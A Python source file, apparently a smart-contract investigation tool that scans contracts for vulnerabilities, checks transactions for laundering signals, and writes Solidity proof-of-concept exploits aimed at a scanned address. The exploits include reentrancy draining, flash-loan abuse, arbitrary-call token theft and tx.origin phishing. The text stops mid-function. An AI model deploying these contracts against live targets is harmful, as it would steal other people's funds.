"""
NanoJS Investigations — Master Pipeline
=========================================
Single file combining:
  1. Vulnerability Scanner (scanner_v3.py)
  2. On-Chain Forensic Generator (nanojs_onchain_generator.py)
  3. Telegram Alert Integration (nanojs_checklist_integration.py)
  4. Word Report Generator (report_generator.py)

Usage:
    python3 nanojs_master.py --contract 0xABC... --chain Ethereum --case NanoJS04
    python3 nanojs_master.py --contract 0xABC... --chain BSC
    python3 nanojs_master.py --contract 0xABC... --chain Ethereum --case NanoJS04 --alert

Chains: Ethereum | BSC | Base | Optimism | Arbitrum

Author : NanoJS Investigations (github.com/NanoJS10)
Contact: nanojs@proton.me
"""

from nanojs_enrichment import *
import os
import re
import sys
import json
import time
import logging
import argparse
import hashlib
import requests
from datetime import datetime, timezone
from pathlib import Path
from dotenv import load_dotenv
from web3 import Web3
from wallet_clustering import run_clustering_phase

# Word report
from docx import Document
from docx.shared import Pt, RGBColor, Inches
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn
from docx.oxml import OxmlElement

load_dotenv()

# ═════════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
TELEGRAM_CHAT_ID   = os.getenv("TELEGRAM_CHAT_ID",   "")
ETHERSCAN_API_KEY  = os.getenv("ETHERSCAN_API_KEY",  "")
ALCHEMY_API_KEY    = os.getenv("ALCHEMY_API_KEY",    "")

OUTPUT_DIR   = Path("./reports")
FORENSIC_DIR = Path("./forensic_logs")
OUTPUT_DIR.mkdir(exist_ok=True)
FORENSIC_DIR.mkdir(exist_ok=True)

ALERT_THRESHOLD = 20

CHAINS = {
    "Ethereum": {
        "rpc":      os.getenv("RPC_ETHEREUM", f"https://eth-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}"),
        "api_url":  "https://api.etherscan.io/v2/api",
        "chain_id": "1",
        "explorer": "https://etherscan.io",
        "native":   "ETH",
        "alchemy_name": "ethereum",
    },
    "BSC": {
        "rpc":      os.getenv("RPC_BSC", "https://bsc-dataseed1.binance.org/"),
        "api_url":  "https://api.etherscan.io/v2/api",
        "chain_id": "56",
        "explorer": "https://bscscan.com",
        "native":   "BNB",
        "alchemy_name": "bsc",
    },
    "Base": {
        "rpc":      os.getenv("RPC_BASE", f"https://base-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}"),
        "api_url":  "https://api.etherscan.io/v2/api",
        "chain_id": "8453",
        "explorer": "https://basescan.org",
        "native":   "ETH",
        "alchemy_name": "base",
    },
    "Optimism": {
        "rpc":      os.getenv("RPC_OPTIMISM", f"https://opt-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}"),
        "api_url":  "https://api.etherscan.io/v2/api",
        "chain_id": "10",
        "explorer": "https://optimistic.etherscan.io",
        "native":   "ETH",
        "alchemy_name": "optimism",
    },
    "Arbitrum": {
        "rpc":      os.getenv("RPC_ARBITRUM", f"https://arb-mainnet.g.alchemy.com/v2/{ALCHEMY_API_KEY}"),
        "api_url":  "https://api.etherscan.io/v2/api",
        "chain_id": "42161",
        "explorer": "https://arbiscan.io",
        "native":   "ETH",
        "alchemy_name": "arbitrum",
    },
}

KNOWN_MIXERS = {
    "0x722122df12d4e14e13ac3b6895a86e84145b6967",
    "0xd90e2f925da726b50c4ed8d0fb90ad053324f31b",
    "0x47ce0c6ed5b0ce3d3a51fdb1c52dc66a7c3c2936",
    "0x910cbd523d972eb0a6f4cae4618ad62622b39dbf",
    "0xa160cdab225685da1d56aa342ad8841c3b53f291",
    "0x23773e65ed146a459667ab77af68e4919b8b5b69",
}

KNOWN_BRIDGES = {
    "0x40ec5b33f54e0e8a33a975908c5ba1c14e5bbbdf",
    "0x8484ef722627bf18ca5ae6bcf031c23e6e922b30",
    "0x99c9fc46f92e8a1c0dec1b1747d010903e884be1",
}

SEVERITY_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}

# ═════════════════════════════════════════════════════════════════════════════
# LOGGING
# ═════════════════════════════════════════════════════════════════════════════

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler(FORENSIC_DIR / "nanojs_master.log"),
    ],
)
log = logging.getLogger("NanoJS")

# ═════════════════════════════════════════════════════════════════════════════
# PART 1 — VULNERABILITY SCANNER
# ═════════════════════════════════════════════════════════════════════════════

SOURCE_PATTERNS = {
    "REENTRANCY": {
        "name": "Reentrancy Vulnerability",
        "severity": "CRITICAL",
        "description": "External call made before state update. Attacker can re-enter and drain funds.",
        "required_patterns": [r"\.call\{value"],
        "supporting_patterns": [
            r"balances\[.*\]\s*-=",
            r"balances\[.*\]\s*=\s*0",
            r"userBalance\s*=\s*0",
        ],
        "exclusion_patterns": [r"nonReentrant", r"ReentrancyGuard", r"_status\s*="],
        "cwe": "CWE-841", "reference": "SWC-107", "min_confidence": 70,
    },
    "FLASH_LOAN": {
        "name": "Flash Loan Price Oracle Manipulation",
        "severity": "HIGH",
        "description": "Spot balance used for pricing — manipulable via flash loan.",
        "required_patterns": [r"balanceOf\(address\(this\)\)"],
        "supporting_patterns": [r"price\s*=", r"getReserves\(\)", r"require.*amount.*balance"],
        "exclusion_patterns": [r"TWAP", r"twap", r"oracle", r"chainlink", r"AggregatorV3"],
        "cwe": "CWE-362", "reference": "Flash Loan Oracle Manipulation", "min_confidence": 65,
    },
    "ACCESS_CONTROL": {
        "name": "Missing Access Control on Privileged Function",
        "severity": "CRITICAL",
        "description": "Privileged function callable by any address — missing onlyOwner or role check.",
        "required_patterns": [
            r"function\s+(mint|withdraw|emergencyWithdraw|setOwner|addMinter)\s*\([^)]*\)\s*(public|external)\s*(override\s*)?\{",
        ],
        "supporting_patterns": [r"function\s+mint\s*\(", r"function\s+withdraw\s*\("],
        "exclusion_patterns": [
            r"onlyOwner", r"onlyRole", r"onlyMinter",
            r"require.*owner", r"require.*msg\.sender",
            r"_checkOwner", r"whenClaimable", r"whenDepositable",
        ],
        "cwe": "CWE-284", "reference": "SWC-105", "min_confidence": 75,
    },
    "UNPROTECTED_INIT": {
        "name": "Unprotected Initializer Function",
        "severity": "CRITICAL",
        "description": "initialize() callable by anyone — attacker can take ownership.",
        "required_patterns": [r"function\s+initialize\s*\([^)]*\)\s*(public|external)"],
        "supporting_patterns": [r"function\s+initialize\s*\("],
        "exclusion_patterns": [r"initializer", r"onlyInitializing", r"_disableInitializers", r"reinitializer"],
        "cwe": "CWE-284", "reference": "Unprotected Proxy Initializer", "min_confidence": 80,
    },
    "TX_ORIGIN": {
        "name": "tx.origin Authentication Bypass",
        "severity": "HIGH",
        "description": "tx.origin used for auth — vulnerable to phishing via malicious contracts.",
        "required_patterns": [r"tx\.origin\s*=="],
        "supporting_patterns": [r"require\s*\(\s*tx\.origin", r"tx\.origin\s*!="],
        "exclusion_patterns": [],
        "cwe": "CWE-290", "reference": "SWC-115", "min_confidence": 80,
    },
    "SELFDESTRUCT": {
        "name": "Unprotected SELFDESTRUCT",
        "severity": "CRITICAL",
        "description": "selfdestruct() present without sufficient access control.",
        "required_patterns": [r"selfdestruct\s*\("],
        "supporting_patterns": [r"suicide\s*\("],
        "exclusion_patterns": [r"onlyOwner", r"require.*owner", r"require.*msg\.sender"],
        "cwe": "CWE-284", "reference": "SWC-106", "min_confidence": 70,
    },
    "ARBITRARY_CALL": {
        "name": "Arbitrary External Call",
        "severity": "HIGH",
        "description": "call() to arbitrary address with user-controlled target/data.",
        "required_patterns": [r"\.call\("],
        "supporting_patterns": [r"address\(.*\)\.call", r"_target\.call", r"target\.call", r"to\.call"],
        "exclusion_patterns": [r"onlyOwner", r"require.*whitelist", r"require.*approved"],
        "cwe": "CWE-20", "reference": "Arbitrary Call Vulnerability", "min_confidence": 65,
    },
}

BYTECODE_PATTERNS = {
    "SELFDESTRUCT_BYTECODE": {
        "name": "SELFDESTRUCT Opcode Detected",
        "severity": "HIGH",
        "description": "Bytecode contains SELFDESTRUCT opcode (0xFF). Unverified — manual review required.",
        "opcode": "ff", "cwe": "CWE-284",
        "reference": "SWC-106 (Bytecode)", "confidence": 50,
    },
    "DELEGATECALL_BYTECODE": {
        "name": "DELEGATECALL Opcode Detected",
        "severity": "MEDIUM",
        "description": "Bytecode contains DELEGATECALL (0xF4). Proxy pattern risk. Unverified.",
        "opcode": "f4", "cwe": "CWE-284",
        "reference": "EIP-1967 (Bytecode)", "confidence": 40,
    },
}

DANGEROUS_SELECTORS = {
    "0x42966c68": "burn(uint256)",
    "0x40c10f19": "mint(address,uint256)",
    "0x2e1a7d4d": "withdraw(uint256)",
    "0xf2fde38b": "transferOwnership(address)",
    "0x3659cfe6": "upgradeTo(address)",
    "0x853828b6": "withdrawAll()",
    "0xddc63262": "emergencyWithdraw()",
    "0x4641257d": "harvest()",
    "0xe9fad8ee": "exit()",
    "0x3ccfd60b": "withdraw()",
}


class ChainScanner:
    def __init__(self, chain_name, config):
        self.chain  = chain_name
        self.config = config
        self.w3     = None
        if config["rpc"]:
            w3 = Web3(Web3.HTTPProvider(config["rpc"]))
            if w3.is_connected():
                self.w3 = w3
                log.info(f"[{chain_name}] Connected — block {w3.eth.block_number:,}")
            else:
                log.warning(f"[{chain_name}] RPC not reachable.")

    def get_source(self, address):
        api_key = ETHERSCAN_API_KEY
        if not api_key:
            return None, None, None
        try:
            r = requests.get(self.config["api_url"], params={
                "chainid": self.config["chain_id"],
                "module": "contract", "action": "getsourcecode",
                "address": address, "apikey": api_key,
            }, timeout=15)
            data = r.json()
            if data.get("status") == "1" and data["result"]:
                result = data["result"][0]
                source = result.get("SourceCode", "").strip()
                if source:
                    return source, result.get("ContractName", "Unknown"), result.get("CompilerVersion", "")
        except Exception as e:
            log.debug(f"Source fetch failed {address}: {e}")
        return None, None, None

    def get_abi(self, address):
        if not ETHERSCAN_API_KEY:
            return None
        try:
            r = requests.get(self.config["api_url"], params={
                "chainid": self.config["chain_id"],
                "module": "contract", "action": "getabi",
                "address": address, "apikey": ETHERSCAN_API_KEY,
            }, timeout=15)
            data = r.json()
            if data.get("status") == "1":
                return json.loads(data["result"])
        except Exception:
            pass
        return None

    def get_bytecode(self, address):
        if not self.w3:
            return ""
        try:
            return self.w3.eth.get_code(Web3.to_checksum_address(address)).hex()
        except Exception:
            return ""


class SourceDetector:
    def scan(self, source):
        findings = []
        for vuln_id, pattern in SOURCE_PATTERNS.items():
            confidence = 0
            evidence   = []
            excluded = any(re.search(e, source, re.IGNORECASE) for e in pattern["exclusion_patterns"])
            if excluded:
                continue
            required_ok = True
            for req in pattern["required_patterns"]:
                matches = re.findall(req, source, re.IGNORECASE | re.MULTILINE)
                if matches:
                    confidence += 40
                    for ln, line in enumerate(source.split("\n"), 1):
                        if re.search(req, line, re.IGNORECASE):
                            evidence.append(f"Line {ln}: `{line.strip()[:120]}`")
                            break
                else:
                    required_ok = False
                    break
            if not required_ok:
                continue
            for supp in pattern["supporting_patterns"]:
                if re.search(supp, source, re.IGNORECASE | re.MULTILINE):
                    confidence += 20
                    for ln, line in enumerate(source.split("\n"), 1):
                        if re.search(supp, line, re.IGNORECASE):
                            evidence.append(f"Line {ln}: `{line.strip()[:120]}`")
                            break
            if confidence >= pattern.get("min_confidence", 60) and evidence:
                findings.append({
                    "vuln_id": vuln_id, "name": pattern["name"],
                    "severity": pattern["severity"], "confidence": min(confidence, 95),
                    "description": pattern["description"], "evidence": evidence,
                    "cwe": pattern["cwe"], "reference": pattern["reference"],
                    "unverified": False,
                })
        findings.sort(key=lambda f: SEVERITY_ORDER.get(f["severity"], 9))
        return findings


class BytecodeAnalyser:
    def scan_bytecode(self, bytecode):
        findings = []
        for vuln_id, pattern in BYTECODE_PATTERNS.items():
            if pattern["opcode"] in bytecode.lower():
                findings.append({
                    "vuln_id": vuln_id, "name": pattern["name"],
                    "severity": pattern["severity"], "confidence": pattern["confidence"],
                    "description": pattern["description"],
                    "evidence": [f"Opcode 0x{pattern['opcode'].upper()} found in bytecode",
                                 "NOTE: Unverified — manual review required"],
                    "cwe": pattern["cwe"], "reference": pattern["reference"],
                    "unverified": True,
                })
        return findings

    def scan_selectors(self, bytecode):
        findings = []
        matches  = re.findall(r"63([0-9a-f]{8})14", bytecode.lower())
        dangerous = [s for s in set(matches) if f"0x{s}" in DANGEROUS_SELECTORS]
        if dangerous:
            findings.append({
                "vuln_id": "DANGEROUS_FUNCTIONS",
                "name": "Dangerous Functions Detected (Unverified)",
                "severity": "MEDIUM", "confidence": 45,
                "description": "Contract exposes potentially dangerous functions. Source not verified.",
                "evidence": [f"Selector 0x{s} = {DANGEROUS_SELECTORS.get(f'0x{s}', 'unknown')}" for s in dangerous],
                "cwe": "CWE-284", "reference": "Function Selector Analysis",
                "unverified": True,
            })
        return findings


class PoCGenerator:
    def generate(self, vuln_id, contract, source=None):
        addr  = contract["contract_address"]
        chain = contract["chain"]
        date  = datetime.utcnow().strftime("%Y-%m-%d")
        wfn   = self._find(source, ["withdraw","claim","unstake","exit","redeem"])
        dfn   = self._find(source, ["deposit","stake","add"])
        mfn   = self._find(source, ["mint","mintTo"])
        ifn   = self._find(source, ["initialize","init"])
        tpl = {
            "REENTRANCY": self._reentrancy(addr,chain,date,wfn,dfn),
            "ACCESS_CONTROL": self._access(addr,chain,date,mfn),
            "UNPROTECTED_INIT": self._init(addr,chain,date,ifn),
            "SELFDESTRUCT": self._selfdestruct(addr,chain,date),
            "SELFDESTRUCT_BYTECODE": self._selfdestruct(addr,chain,date),
            "TX_ORIGIN": self._txorigin(addr,chain,date),
            "FLASH_LOAN": self._flashloan(addr,chain,date),
            "ARBITRARY_CALL": self._arb(addr,chain,date),
            "DANGEROUS_FUNCTIONS": self._dangerous(addr,chain,date),
        }
        return tpl.get(vuln_id)

    def _find(self, src, candidates):
        if not src: return candidates[0]
        for n in candidates:
            m = re.search(rf"function\s+({n}\w*)\s*\(", src, re.IGNORECASE)
            if m: return m.group(1)
        return candidates[0]

    def _reentrancy(self, addr, chain, date, wfn, dfn):
        dl = f"target.{dfn}{{value: msg.value}}();" if dfn else "// fund manually"
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Reentrancy | {addr} | {chain} | {date}
interface ITarget {{ function {wfn}(uint256) external; {"function "+dfn+"() external payable;" if dfn else ""} }}
contract NanoJS_ReentrancyPoC {{
    ITarget public target; address public owner; uint256 public amt; uint256 private cnt;
    constructor(address _t) {{ target=ITarget(_t); owner=msg.sender; }}
    function attack() external payable {{ require(msg.sender==owner); amt=msg.value; cnt=0; {dl} target.{wfn}(amt); }}
    receive() external payable {{ if(cnt++<5 && address(target).balance>=amt) target.{wfn}(amt); }}
    function collect() external {{ require(msg.sender==owner); (bool ok,)=owner.call{{value:address(this).balance}}(""); require(ok); }}
}}'''

    def _access(self, addr, chain, date, mfn):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Missing Access Control | {addr} | {chain} | {date}
interface ITarget {{ function {mfn}(address,uint256) external; function balanceOf(address) external view returns(uint256); }}
contract NanoJS_AccessControlPoC {{
    ITarget public target; address public owner;
    event Result(bool,uint256,uint256);
    constructor(address _t) {{ target=ITarget(_t); owner=msg.sender; }}
    function testMint(uint256 amt) external {{ require(msg.sender==owner); uint256 b=target.balanceOf(address(this));
        try target.{mfn}(address(this),amt) {{ emit Result(true,b,target.balanceOf(address(this))); }} catch {{ emit Result(false,b,b); }} }}
}}'''

    def _init(self, addr, chain, date, ifn):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Unprotected Init | {addr} | {chain} | {date}
interface ITarget {{ function {ifn}(address) external; function owner() external view returns(address); }}
contract NanoJS_InitPoC {{
    ITarget public target; address public owner;
    event Result(bool,address);
    constructor(address _t) {{ target=ITarget(_t); owner=msg.sender; }}
    function test() external {{ require(msg.sender==owner);
        try target.{ifn}(address(this)) {{ emit Result(target.owner()==address(this),target.owner()); }}
        catch {{ emit Result(false,address(0)); }} }}
}}'''

    def _selfdestruct(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — SELFDESTRUCT | {addr} | {chain} | {date}
interface ITarget {{ function destroy() external; }}
contract NanoJS_SelfDestructPoC {{
    ITarget public target; address public owner;
    event Result(bool,uint256);
    constructor(address _t) {{ target=ITarget(_t); owner=msg.sender; }}
    function test() external {{ require(msg.sender==owner); uint256 b=address(target).balance;
        try target.destroy() {{ emit Result(true,b); }} catch {{ emit Result(false,b); }} }}
    receive() external payable {{}}
}}'''

    def _txorigin(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — tx.origin Bypass | {addr} | {chain} | {date}
interface ITarget {{ function withdraw(uint256) external; }}
contract NanoJS_TxOriginPoC {{
    ITarget public target; address public attacker;
    constructor(address _t) {{ target=ITarget(_t); attacker=msg.sender; }}
    function trickedCall(uint256 amt) external {{ target.withdraw(amt); }}
    receive() external payable {{ (bool ok,)=attacker.call{{value:address(this).balance}}(""); require(ok); }}
}}'''

    def _flashloan(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Flash Loan | {addr} | {chain} | {date}
interface ILender {{ function flashLoan(address,address,uint256,bytes calldata) external; }}
interface ITarget {{ function vulnerableFunction(uint256) external; }}
interface IERC20 {{ function approve(address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); function transfer(address,uint256) external returns(bool); }}
contract NanoJS_FlashLoanPoC {{
    address public owner; ILender lender; ITarget target; IERC20 token;
    constructor(address _l,address _t,address _tk) {{ owner=msg.sender; lender=ILender(_l); target=ITarget(_t); token=IERC20(_tk); }}
    function attack(uint256 amt) external {{ require(msg.sender==owner); lender.flashLoan(address(this),address(token),amt,abi.encode(amt)); }}
    function executeOperation(address,uint256 amt,uint256 prem,address,bytes calldata) external returns(bool) {{
        token.approve(address(target),type(uint256).max); target.vulnerableFunction(amt); token.approve(msg.sender,amt+prem); return true; }}
    function collect() external {{ require(msg.sender==owner); token.transfer(owner,token.balanceOf(address(this))); }}
}}'''

    def _arb(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Arbitrary Call | {addr} | {chain} | {date}
interface ITarget {{ function execute(address,bytes calldata) external; }}
interface IERC20 {{ function transferFrom(address,address,uint256) external returns(bool); function balanceOf(address) external view returns(uint256); }}
contract NanoJS_ArbCallPoC {{
    address public owner; ITarget public target;
    constructor(address _t) {{ owner=msg.sender; target=ITarget(_t); }}
    function testSteal(address token,uint256 amt) external {{ require(msg.sender==owner);
        bytes memory data=abi.encodeWithSignature("approve(address,uint256)",address(this),amt);
        target.execute(token,data); IERC20(token).transferFrom(address(target),owner,IERC20(token).balanceOf(address(target))); }}
}}'''

    def _dangerous(self, addr, chain, date):
        return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
// NanoJS PoC — Dangerous Functions | {addr} | {chain} | {date}
interface ITarget {{ function withdraw() external; function emergencyWithdraw() external; function mint(address,uint256) external; }}
contract NanoJS_DangerousPoC {{
    ITarget public target; address public owner;
    event Result(string,bool);
    constructor(address _t) {{ target=ITarget(_t); owner=msg.sender; }}
    function testWithdraw() external {{ require(msg.sender==owner); try target.withdraw() {{ emit Result("withdraw",true); }} catch {{ emit Result("withdraw",false); }} }}
    function testEmergency() external {{ require(msg.sender==owner); try target.emergencyWithdraw() {{ emit Result("emergency",true); }} catch {{ emit Result("emergency",false); }} }}
    receive() external payable {{}}
}}'''


def run_vuln_scan(address, chain_name):
    """Run vulnerability scan and return results."""
    cfg      = CHAINS.get(chain_name)
    if not cfg:
        log.error(f"Unknown chain: {chain_name}")
        return []

    scanner  = ChainScanner(chain_name, cfg)
    src_det  = SourceDetector()
    bc_anal  = BytecodeAnalyser()
    poc_gen  = PoCGenerator()

    contract = {
        "chain": chain_name,
        "contract_address": address,
        "deployer": "N/A", "tx_hash": "N/A", "block": "N/A",
        "timestamp": datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC"),
        "explorer_url": f"{cfg['explorer']}/address/{address}",
    }

    log.info(f"[{chain_name}] Scanning {address}...")
    source, name, compiler = scanner.get_source(address)
    findings = []
    pocs     = {}
    src_avail = False

    if source:
        src_avail = True
        contract["contract_name"] = name
        contract["compiler"]      = compiler
        log.info(f"[{chain_name}] ✓ Verified: {name} ({compiler})")
        findings = src_det.scan(source)
        for f in findings:
            poc = poc_gen.generate(f["vuln_id"], contract, source)
            if poc: pocs[f["vuln_id"]] = poc
    else:
        contract["contract_name"] = "Unverified"
        contract["compiler"]      = "Unknown"
        log.info(f"[{chain_name}] ⚠ Unverified — analysing bytecode...")
        bytecode = scanner.get_bytecode(address)
        if not bytecode or bytecode == "0x":
            log.info(f"[{chain_name}] Empty bytecode — skipping.")
            return []
        findings  = bc_anal.scan_bytecode(bytecode)
        findings += bc_anal.scan_selectors(bytecode)
        for f in findings:
            poc = poc_gen.generate(f["vuln_id"], contract)
            if poc: pocs[f["vuln_id"]] = poc

    if findings:
        log.warning(f"[{chain_name}] {len(findings)} finding(s) ({'verified' if src_avail else 'unverified'})")
        return [{"contract": contract, "findings": findings, "pocs": pocs,
                 "source_available": src_avail, "abi_available": scanner.get_abi(address) is not None,
                 "bytecode_snippet": ""}]

    log.info(f"[{chain_name}] No vulnerabilities found.")
    return []


# ═════════════════════════════════════════════════════════════════════════════
# PART 2 — ON-CHAIN FORENSIC GENERATOR
# ═════════════════════════════════════════════════════════════════════════════

PHASE_WEIGHTS     = {"Wallet Recon & Funding Chain": 30, "Contract Vulnerability Signals": 25,
                     "On-Chain Anomaly Detection": 25, "Post-Exploit Laundering Signals": 20}
SEVERITY_SCORES   = {"CRITICAL": 3, "HIGH": 2, "MEDIUM": 1}
FLASHLOAN_SIGS    = {"0xab9c4b5d","0x5cffe9de","0xd9d98ce4","0xe9cbafb0","0x23e30c8b"}
GAS_MULTIPLIER    = 3
WALLET_AGE_HRS    = 72

DANGEROUS_SELS = {
    "0x40c10f19": ("mint(address,uint256)", "CRITICAL"),
    "0x2e1a7d4d": ("withdraw(uint256)", "HIGH"),
    "0x3ccfd60b": ("withdraw()", "HIGH"),
    "0xf2fde38b": ("transferOwnership(address)", "HIGH"),
    "0x3659cfe6": ("upgradeTo(address)", "CRITICAL"),
    "0x853828b6": ("withdrawAll()", "HIGH"),
    "0xddc63262": ("emergencyWithdraw()", "HIGH"),
}


def etherscan_get(chain_name, params):
    cfg = CHAINS.get(chain_name, {})
    api = cfg.get("api_url", "")
    if not api or not ETHERSCAN_API_KEY:
        return None
    params["apikey"]  = ETHERSCAN_API_KEY
    params["chainid"] = cfg.get("chain_id", "1")
    try:
        r = requests.get(api, params=params, timeout=10)
        d = r.json()
        if d.get("status") == "1":
            return d.get("result")
    except Exception as e:
        log.debug(f"Etherscan error: {e}")
    return None


def get_tx_list(chain, address, limit=200):
    return etherscan_get(chain, {"module":"account","action":"txlist","address":address,
                                  "startblock":0,"endblock":99999999,"page":1,"offset":limit,"sort":"asc"}) or []

def get_internal_txs(chain, address, limit=100):
    return etherscan_get(chain, {"module":"account","action":"txlistinternal","address":address,
                                  "page":1,"offset":limit,"sort":"asc"}) or []

def get_token_transfers(chain, address, limit=100):
    return etherscan_get(chain, {"module":"account","action":"tokentx","address":address,
                                  "page":1,"offset":limit,"sort":"desc"}) or []


def phase1_wallet_recon(w3, chain, address):
    flags = []
    log.info("🔍 Phase 1: Wallet recon & funding chain...")
    txs = get_tx_list(chain, address, 500)
    if not txs: return flags

    deployer = None
    for tx in txs:
        if not tx.get("to") or tx.get("contractAddress","").lower() == address.lower():
            deployer = tx.get("from","").lower()
            break
    if not deployer and txs:
        deployer = txs[0].get("from","").lower()

    if deployer:
        dep_txs = get_tx_list(chain, deployer, 50)
        if dep_txs:
            age_hrs = (int(txs[0].get("timeStamp",0)) - int(dep_txs[0].get("timeStamp",0))) / 3600
            if age_hrs < WALLET_AGE_HRS:
                flags.append({"id":"w1","text":f"Wallet age {age_hrs:.1f}h before interaction (threshold {WALLET_AGE_HRS}h)",
                               "severity":"CRITICAL","phase":"Wallet Recon & Funding Chain",
                               "evidence":{"deployer":deployer,"wallet_age_hours":round(age_hrs,2)}})
        for itx in get_internal_txs(chain, deployer, 20)[:5]:
            if itx.get("from","").lower() in KNOWN_MIXERS:
                flags.append({"id":"w2","text":f"Deployer funded via known mixer",
                               "severity":"CRITICAL","phase":"Wallet Recon & Funding Chain",
                               "evidence":{"deployer":deployer,"mixer":itx.get("from")}})
                break
        if len(dep_txs) < 5:
            flags.append({"id":"w6","text":f"Deployer has minimal history ({len(dep_txs)} txs)",
                           "severity":"MEDIUM","phase":"Wallet Recon & Funding Chain",
                           "evidence":{"deployer":deployer,"tx_count":len(dep_txs)}})
    return flags


def phase2_contract_vulns(chain, address):
    flags = []
    log.info("🔍 Phase 2: Contract vulnerability signals...")
    src_result = etherscan_get(chain, {"module":"contract","action":"getsourcecode","address":address})
    source = src_result[0].get("SourceCode","") if src_result else ""

    if not source.strip():
        flags.append({"id":"c1","text":"Source code unverified on block explorer",
                       "severity":"HIGH","phase":"Contract Vulnerability Signals",
                       "evidence":{"contract":address}})
        return flags

    sl = source.lower()
    if any(p in sl for p in [".call{value:","call.value(","transfer(","send("]) and "nonreentrant" not in sl:
        flags.append({"id":"c6","text":"External call without reentrancy guard",
                       "severity":"HIGH","phase":"Contract Vulnerability Signals",
                       "evidence":{"pattern":".call{value without nonReentrant"}})
    if any(p in source for p in ["function mint","function withdraw","function upgradeTo"]) and \
       not any(p in source for p in ["onlyOwner","onlyRole","require(msg.sender"]):
        flags.append({"id":"c3","text":"Privileged functions with no access control",
                       "severity":"CRITICAL","phase":"Contract Vulnerability Signals",
                       "evidence":{"pattern":"mint/withdraw without onlyOwner"}})
    if "getreserves" in sl and "chainlink" not in sl and "latesanswer" not in sl:
        flags.append({"id":"c4","text":"Oracle relies on single AMM — no Chainlink fallback",
                       "severity":"CRITICAL","phase":"Contract Vulnerability Signals",
                       "evidence":{"pattern":"getReserves without latestAnswer"}})
    if "delegatecall" in sl:
        flags.append({"id":"c5","text":"delegatecall detected — proxy upgrade risk",
                       "severity":"CRITICAL","phase":"Contract Vulnerability Signals",
                       "evidence":{"pattern":"delegatecall in source"}})
    return flags


def phase3_onchain_anomalies(w3, chain, address):
    flags = []
    log.info("🔍 Phase 3: On-chain anomaly detection...")
    txs = get_tx_list(chain, address, 200)
    if not txs: return flags

    gas_vals = [int(tx.get("gasUsed",0)) for tx in txs if tx.get("gasUsed")]
    if gas_vals:
        avg = sum(gas_vals) / len(gas_vals)
        mx  = max(gas_vals)
        if mx > avg * GAS_MULTIPLIER:
            flags.append({"id":"o6","text":f"Gas spike: {mx:,} is {mx/avg:.1f}x above avg ({avg:,.0f})",
                           "severity":"HIGH","phase":"On-Chain Anomaly Detection",
                           "evidence":{"max_gas":mx,"avg_gas":round(avg)}})

    block_map = {}
    for tx in txs:
        block_map.setdefault(tx.get("blockNumber"), []).append(tx)
    for block, btxs in block_map.items():
        has_flash = any(tx.get("input","")[:10] in FLASHLOAN_SIGS for tx in btxs)
        has_large = any(int(tx.get("value",0)) > Web3.to_wei(1,"ether") for tx in btxs)
        if has_flash and has_large:
            flags.append({"id":"o1","text":f"Flash loan + large withdrawal in same block #{block}",
                           "severity":"CRITICAL","phase":"On-Chain Anomaly Detection",
                           "evidence":{"block":block}})

    MAX_U256 = 2**256 - 1
    for ttx in get_token_transfers(chain, address, 100):
        if int(ttx.get("value",0)) >= MAX_U256 * 0.99:
            flags.append({"id":"o4","text":f"Unlimited token approval detected",
                           "severity":"HIGH","phase":"On-Chain Anomaly Detection",
                           "evidence":{"token":ttx.get("tokenSymbol"),"tx":ttx.get("hash")}})
            break
    return flags


def phase4_laundering(chain, address):
    flags = []
    log.info("🔍 Phase 4: Post-exploit laundering signals...")
    txs      = get_tx_list(chain, address, 500)
    internal = get_internal_txs(chain, address, 200)

    outflows = sorted(
        [tx for tx in txs if int(tx.get("value",0)) > Web3.to_wei(0.5,"ether")],
        key=lambda x: int(x.get("value",0)), reverse=True
    )

    for tx in outflows[:10]:
        dest = tx.get("to","").lower()
        if dest in KNOWN_MIXERS:
            flags.append({"id":"p3","text":"Funds routed to known mixer",
                           "severity":"CRITICAL","phase":"Post-Exploit Laundering Signals",
                           "evidence":{"destination":dest,"tx":tx.get("hash")}})
        if dest in KNOWN_BRIDGES:
            flags.append({"id":"p1","text":"Immediate bridge transaction after large outflow",
                           "severity":"CRITICAL","phase":"Post-Exploit Laundering Signals",
                           "evidence":{"bridge":dest,"tx":tx.get("hash")}})

    if len(outflows) >= 3:
        blocks = [int(tx.get("blockNumber",0)) for tx in outflows[:5]]
        rng = max(blocks) - min(blocks) if blocks else 0
        if rng <= 10:
            flags.append({"id":"p2","text":f"Proceeds split across {len(outflows[:5])} wallets in {rng} blocks",
                           "severity":"HIGH","phase":"Post-Exploit Laundering Signals",
                           "evidence":{"split_count":len(outflows[:5]),"block_range":rng}})

    deployer = None
    for tx in txs:
        if not tx.get("to") or tx.get("contractAddress","").lower() == address.lower():
            deployer = tx.get("from","").lower()
            break

    if deployer and outflows:
        attacker = outflows[0].get("from","").lower()
        if deployer != attacker:
            dep_fund = set(t.get("from","").lower() for t in get_internal_txs(chain, deployer, 20)[:5])
            atk_fund = set(t.get("from","").lower() for t in get_internal_txs(chain, attacker, 20)[:5])
            shared   = dep_fund & atk_fund
            if shared:
